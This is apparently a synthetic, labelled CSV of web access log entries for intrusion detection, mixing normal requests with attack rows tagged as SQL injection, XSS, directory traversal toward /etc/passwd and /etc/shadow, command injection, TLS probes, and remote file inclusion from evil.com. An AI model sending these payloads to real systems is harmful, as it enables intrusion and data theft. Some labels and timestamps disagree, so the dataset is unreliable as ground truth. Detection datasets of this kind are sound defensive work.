logged_at,client_ip,method,url,status_code,user_agent,is_attack,attack_type,logged_at.1,ua_family,referrer
2025-05-09T16:57:28+09:00,192.168.1.105,GET,/js/app.js?page=4,302,"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",False,normal,2025-05-06T17:10:49+09:00,mobile_browser,-
2025-05-01T01:05:44+09:00,10.0.0.74,POST,/product?id=10;DROP TABLE users,200,python-requests/2.70,True,sql_injection,2025-05-03T12:09:00+09:00,script,https://google.com/search?q=example
2025-05-01T21:19:13+09:00,194.184.118.216,BADTLS,%255Cx16%255Cx03%255Cx01%255Cx00%255Cx82%255Cx01%255Cx00...,200,sqlmap/1.7#stable,True,tls_probe,2025-05-04T08:01:15+09:00,pentest_tool,-
2025-05-13T01:56:54+09:00,10.0.0.59,GET,/../../../../etc/passwd,403,Metasploit/6.4,True,directory_traversal,2025-05-01T19:29:35+09:00,pentest_tool,-
2025-05-12T16:34:15+09:00,10.149.51.133,BADTLS,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-12T16:34:15+09:00,unknown,-
2025-05-14T20:18:17+09:00,10.0.0.78,POST,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,200,wget/1.9,True,ssrf_rfi,2025-05-04T22:25:11+09:00,script,-
2025-05-06T12:30:54+09:00,10.0.0.216,GET,/admin/backup?file=config;echo+x,200,Nikto/2.1.6 (Evasions:none),True,command_injection,2025-05-03T11:49:43+09:00,pentest_tool,https://twitter.com/
2025-05-14T13:31:04+09:00,192.168.0.206,GET,/api/v1/user/35,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-02T16:34:33+09:00,mobile_browser,https://www.facebook.com/
2025-05-11T15:45:36+09:00,10.217.230.101,UNKNOWN,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-11T15:45:36+09:00,unknown,-
2025-05-07T01:31:49+09:00,192.168.0.185,POST,/about,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0,False,normal,2025-05-05T23:48:22+09:00,browser,https://google.com/search?q=example
2025-05-13T18:26:44+09:00,173.208.75.254,POST,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-08T06:11:27+09:00,browser,-
2025-05-13T08:53:36+09:00,138.87.233.96,BADTLS,\x16\x03\x01\x00\9e\x01\x00…,400,-,True,tls_probe,2025-05-01T16:35:39+09:00,pentest_tool,-
2025-05-02T17:41:32+09:00,10.0.0.176,GET,/admin/backup?file=config;echo+x,200,curl/7.7,True,command_injection,2025-05-03T09:28:28+09:00,script,-
2025-05-12T11:47:13+09:00,3.187.223.16,GET,/images/../../../etc/passwd,200,Mozilla/5.0 (X11; Linux x86_64),True,directory_traversal,2025-05-12T06:55:56+09:00,browser,-
2025-05-01T00:36:24+09:00,192.168.0.223,GET,/api/v1/user/35,200,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),False,normal,2025-05-02T13:33:00+09:00,crawler,https://bing.com/search?q=foo
2025-05-02T20:22:14+09:00,192.168.1.161,GET,/home,200,wget/1.7,False,normal,2025-05-01T21:01:51+09:00,script,https://google.com/search?q=example
2025-05-10T01:00:34+09:00,192.168.0.54,GET,/css/style.css,200,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),False,normal,2025-05-03T14:42:00+09:00,crawler,https://google.com/search?q=example
2025-05-12T00:15:17+09:00,140.145.216.120,GET,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-05T09:00:37+09:00,browser,-
2025-05-01T09:45:19+09:00,10.0.0.226,GET,/load%3Ffile%3Dhttp%3A//evil.com/shell.txt,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",True,ssrf_rfi,2025-05-05T19:33:51+09:00,browser,-
2025-05-09T01:08:53+09:00,10.0.0.41,GET,/search?q=<script>alert('x')</script>,500,python-requests/2.55,True,sql_injection,2025-05-03T11:16:32+09:00,script,-
2025-05-08T22:46:10+09:00,192.168.0.186,POST,/,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",False,normal,2025-05-07T13:19:42+09:00,browser,https://www.facebook.com/
2025-05-11T08:25:54+09:00,10.0.0.197,POST,/images/....//....//etc/passwd,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Edge/103.0,True,directory_traversal,2025-05-04T14:58:33+09:00,browser,-
2025-05-05T01:22:36+09:00,192.168.0.64,POST,/products,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Edge/105.0,False,normal,2025-05-03T11:55:00+09:00,browser,https://bing.com/search?q=foo
2025-05-10T17:47:13+09:00,10.0.0.164,POST,/images/....//....//etc/passwd,403,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),True,directory_traversal,2025-05-04T17:22:50+09:00,crawler,-
2025-05-05T22:58:30+09:00,192.168.0.101,GET,/api/v1/user/35,200,curl/8.7,False,normal,2025-05-02T22:02:16+09:00,script,https://google.com/search?q=example
2025-05-06T00:04:11+09:00,192.168.0.7,POST,/api/v1/user/35?page=2,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-05T06:01:28+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-07T22:18:55+09:00,95.206.139.95,POST,/home,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-01T22:24:42+09:00,browser,https://example.com/
2025-05-06T18:49:43+09:00,196.43.248.154,GET,/static/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-08T06:24:15+09:00,browser,https://example.com/
2025-05-04T16:47:33+09:00,10.0.0.67,POST,/product?id=10;DROP TABLE users,403,OWASP ZAP,True,sql_injection,2025-05-03T20:57:31+09:00,pentest_tool,-
2025-05-14T13:28:46+09:00,10.95.84.84,BADTLS,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,500,-,True,tls_probe,2025-05-14T13:28:46+09:00,unknown,-
2025-05-09T12:12:06+09:00,192.168.0.62,POST,/?page=1,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Edge/106.0,False,normal,2025-05-05T17:24:06+09:00,browser,https://twitter.com/
2025-05-06T08:20:52+09:00,192.168.0.85,POST,/api/v1/user/35,200,DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html),False,normal,2025-05-06T12:43:26+09:00,crawler,https://example.com/prev
2025-05-11T00:28:49+09:00,10.0.0.138,GET,/comment?msg=<script>alert('x')</script>,500,Nikto/2.1.6 (Evasions:none),True,xss,2025-05-05T07:13:28+09:00,pentest_tool,-
2025-05-12T07:40:02+09:00,10.0.0.173,POST,/load%3Ffile%3Dhttp%3A//evil.com/shell.txt,200,wpscan/3.8.23,True,ssrf_rfi,2025-05-02T10:17:37+09:00,pentest_tool,-
2025-05-07T15:42:32+09:00,10.201.138.88,PRI,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-07T15:42:32+09:00,unknown,-
2025-05-06T10:51:58+09:00,13.80.66.227,BADTLS,\x16\x03\x01\x00\85\x01\x00…,400,-,True,tls_probe,2025-05-11T02:37:06+09:00,pentest_tool,-
2025-05-06T08:09:16+09:00,192.168.0.113,GET,/home?page=4,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-04T16:13:43+09:00,mobile_browser,https://twitter.com/
2025-05-10T17:39:55+09:00,192.168.0.74,GET,/signup,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-04T18:37:53+09:00,browser,https://example.com/prev
2025-05-01T00:10:37+09:00,192.168.0.244,GET,/products?page=2,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Edge/101.0,False,normal,2025-05-03T18:23:08+09:00,browser,https://bing.com/search?q=foo
2025-05-02T16:04:50+09:00,192.168.0.25,GET,/products,304,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0,False,normal,2025-05-07T22:28:18+09:00,browser,https://twitter.com/
2025-05-10T18:35:25+09:00,174.159.107.210,GET,/api/login?username=user&password=secret,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-05T12:22:09+09:00,browser,-
2025-05-13T05:35:25+09:00,204.195.132.54,GET,/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E,200,Mozilla/5.0 (X11; Linux x86_64),True,xss,2025-05-10T07:03:52+09:00,browser,-
2025-05-07T09:16:18+09:00,10.0.0.31,POST,/../../../../etc/passwd,500,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",True,directory_traversal,2025-05-03T15:10:01+09:00,browser,-
2025-05-11T20:33:59+09:00,192.168.0.120,POST,/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0,False,normal,2025-05-03T14:17:59+09:00,browser,https://google.com/search?q=example
2025-05-08T15:25:49+09:00,192.168.0.18,GET,/login,200,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-07T08:36:26+09:00,mobile_browser,-
2025-05-14T17:23:13+09:00,192.168.0.53,POST,/api/v1/user/35?page=5,302,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),False,normal,2025-05-07T13:45:09+09:00,crawler,https://www.facebook.com/
2025-05-12T00:35:53+09:00,192.168.0.66,GET,/login,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-05T23:29:57+09:00,browser,https://www.facebook.com/
2025-05-03T05:15:48+09:00,170.75.58.119,GET,/index.php?page=../../../../etc/shadow%00,403,Mozilla/5.0 (X11; Linux x86_64),True,directory_traversal,2025-05-01T03:16:36+09:00,browser,-
2025-05-01T07:44:35+09:00,192.168.0.166,GET,/search?q=shoes,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",False,normal,2025-05-01T07:28:45+09:00,browser,-
2025-05-12T07:08:57+09:00,192.168.0.198,POST,/,200,wget/1.8,False,normal,2025-05-07T20:56:18+09:00,script,https://google.com/search?q=example
2025-05-03T15:06:26+09:00,111.6.236.42,GET,/about,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-02T00:33:27+09:00,browser,-
2025-05-01T08:30:42+09:00,92.83.100.20,GET,/login.php?username=admin' OR '1'='1'--,200,sqlmap/1.7.4#stable,True,sql_injection,2025-05-06T13:46:52+09:00,pentest_tool,-
2025-05-02T12:00:06+09:00,192.168.0.213,POST,/login,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0,False,normal,2025-05-01T20:01:36+09:00,browser,https://example.com/prev
2025-05-09T05:37:12+09:00,40.136.136.122,GET,/download?file=..%2F..%2F..%2Fetc%2Fhosts,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,directory_traversal,2025-05-02T16:32:30+09:00,browser,-
2025-05-12T12:09:33+09:00,67.18.147.94,GET,/contact,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-11T16:19:10+09:00,browser,https://example.com/
2025-05-03T07:37:34+09:00,10.0.0.179,POST,/admin/backup?file=config;echo+x,200,OWASP ZAP,True,command_injection,2025-05-07T09:05:47+09:00,pentest_tool,-
2025-05-09T13:42:40+09:00,192.168.0.30,GET,/api/v1/user/35,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0,False,normal,2025-05-01T15:13:06+09:00,browser,https://twitter.com/
2025-05-05T12:27:55+09:00,192.168.0.220,GET,/about,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-07T21:34:20+09:00,mobile_browser,https://twitter.com/
2025-05-07T12:49:12+09:00,192.168.0.228,GET,/search?q=shoes,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-04T16:32:22+09:00,mobile_browser,https://twitter.com/
2025-05-02T22:12:46+09:00,10.0.0.236,POST,/product%3Fid%3D10%3BDROP%20TABLE%20users,200,Nessus v10.5,True,sql_injection,2025-05-06T13:11:01+09:00,pentest_tool,-
2025-05-04T13:20:09+09:00,10.0.0.196,GET,/comment%253Fmsg%253D%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,403,wget/1.6,True,xss,2025-05-01T21:57:59+09:00,script,-
2025-05-13T23:31:01+09:00,223.164.127.249,GET,/about,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-04T18:53:12+09:00,browser,-
2025-05-09T18:57:19+09:00,151.157.84.139,GET,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-03T11:11:46+09:00,browser,-
2025-05-06T20:56:09+09:00,192.168.0.66,GET,/about,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-05T22:12:12+09:00,mobile_browser,https://www.facebook.com/
2025-05-11T03:27:08+09:00,130.252.164.83,POST,/home,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-12T16:37:42+09:00,browser,https://example.com/
2025-05-09T16:22:50+09:00,10.0.0.160,GET,/load?file=http://evil.com/shell.txt,403,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",True,ssrf_rfi,2025-05-07T07:12:08+09:00,browser,-
2025-05-14T13:29:10+09:00,192.168.0.39,POST,/js/app.js,200,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),False,normal,2025-05-01T07:26:02+09:00,crawler,https://www.facebook.com/
2025-05-13T12:58:18+09:00,142.250.65.109,BADTLS,\x16\x03\x01\x00\9b\x01\x00…,400,-,True,tls_probe,2025-05-11T04:56:34+09:00,pentest_tool,-
2025-05-08T00:24:34+09:00,192.168.0.33,GET,/css/style.css,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Edge/106.0,False,normal,2025-05-05T10:06:12+09:00,browser,https://twitter.com/
2025-05-11T22:01:27+09:00,192.168.0.4,GET,/product?id=10;DROP TABLE users,200,wpscan/3.8.23,True,sql_injection,2025-05-03T19:02:40+09:00,pentest_tool,-
2025-05-14T22:35:28+09:00,172.16.0.117,POST,/signup,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-05T13:29:33+09:00,crawler,https://twitter.com/
2025-05-06T00:10:27+09:00,5.111.165.62,GET,/index.php?page=../../../../etc/shadow%00,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,directory_traversal,2025-05-11T02:47:59+09:00,browser,-
2025-05-10T16:19:17+09:00,245.40.83.48,GET,/download?file=..%2F..%2F..%2Fetc%2Fhosts,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,directory_traversal,2025-05-05T10:03:29+09:00,browser,-
2025-05-10T01:53:31+09:00,154.226.5.3,BADTLS,%255Cx16%255Cx03%255Cx01%255Cx00%255Cx82%255Cx01%255Cx00...,200,sqlmap/1.7#stable,True,tls_probe,2025-05-01T18:53:26+09:00,pentest_tool,-
2025-05-11T21:14:56+09:00,192.168.0.71,GET,/products/4.html?page=5,302,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),False,normal,2025-05-01T14:30:16+09:00,crawler,https://example.com/prev
2025-05-14T01:05:35+09:00,192.168.0.235,GET,/products/4.html,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-04T18:23:19+09:00,mobile_browser,https://www.facebook.com/
2025-05-03T22:33:27+09:00,192.168.0.43,GET,/home?page=5,200,Twitterbot/1.0,False,normal,2025-05-01T23:47:35+09:00,crawler,https://google.com/search?q=example
2025-05-12T20:06:37+09:00,250.255.108.177,GET,/about,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-03T06:17:44+09:00,browser,https://example.com/
2025-05-08T22:39:59+09:00,192.168.0.9,GET,/about,304,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",False,normal,2025-05-04T10:24:09+09:00,browser,https://google.com/search?q=example
2025-05-11T15:06:29+09:00,10.0.0.239,GET,/comment?msg=<script>alert('x')</script>,404,Metasploit/6.4,True,xss,2025-05-07T12:18:09+09:00,pentest_tool,-
2025-05-09T16:33:08+09:00,10.0.0.241,POST,/load?file=http://evil.com/shell.txt,500,wget/1.2,True,ssrf_rfi,2025-05-06T18:53:56+09:00,script,-
2025-05-10T13:38:09+09:00,192.168.0.238,GET,/signup,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Edge/101.0,False,normal,2025-05-01T06:06:04+09:00,browser,https://www.facebook.com/
2025-05-05T13:09:08+09:00,10.0.0.180,GET,/admin/backup%3Ffile%3Dconfig%3Becho%2Bx,500,Nikto/2.1.6 (Evasions:none),True,command_injection,2025-05-05T09:28:02+09:00,pentest_tool,-
2025-05-03T13:09:07+09:00,10.0.0.230,GET,/load?file=http://evil.com/shell.txt,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",True,ssrf_rfi,2025-05-03T06:32:14+09:00,browser,-
2025-05-01T01:45:31+09:00,192.168.0.2,POST,/signup,200,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),False,normal,2025-05-06T14:43:33+09:00,crawler,https://bing.com/search?q=foo
2025-05-04T16:43:19+09:00,10.0.0.200,GET,/admin/backup%253Ffile%253Dconfig%253Becho%252Bx,403,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",True,command_injection,2025-05-04T23:32:57+09:00,browser,-
2025-05-04T01:34:49+09:00,192.168.0.7,GET,/products/4.html,200,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-01T14:45:29+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-03T17:42:01+09:00,10.25.143.135,GET,/api/items?id=86&sort=asc,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-03T17:42:01+09:00,browser,https://search.example.com?q=shoes
2025-05-13T10:39:19+09:00,226.210.41.23,GET,/include?template=http://evil.com/shell.txt,502,python-requests/2.25.1,True,ssrf_rfi,2025-05-13T00:33:22+09:00,script,-
2025-05-04T01:20:43+09:00,10.0.0.185,POST,/product?id=10;DROP TABLE users,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0,True,sql_injection,2025-05-05T23:23:35+09:00,browser,https://www.facebook.com/
2025-05-13T22:35:06+09:00,10.0.0.135,GET,/product?id=10;DROP TABLE users,403,Twitterbot/1.0,True,sql_injection,2025-05-02T08:10:02+09:00,crawler,-
2025-05-05T16:08:16+09:00,192.168.0.159,GET,/products,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",False,normal,2025-05-04T12:35:09+09:00,browser,https://www.facebook.com/
